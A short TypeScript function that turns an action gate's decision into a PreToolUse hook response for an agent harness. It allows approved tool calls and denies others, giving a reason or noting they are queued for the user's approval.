export function hookOutput(toolName: string, decision: GateDecision): Record<string, unknown> {
  if (decision.action === "allow") {
    if (!toolName.startsWith("mcp__")) return {};
    return { hookSpecificOutput: { hookEventName: "PreToolUse", permissionDecision: "allow", permissionDecisionReason: "allowed by Prevail's action gate" } };
  }
  return {
    hookSpecificOutput: {
      hookEventName: "PreToolUse",
      permissionDecision: "deny",
      permissionDecisionReason: decision.reason ?? "queued for the user's approval",
    },
  };
}
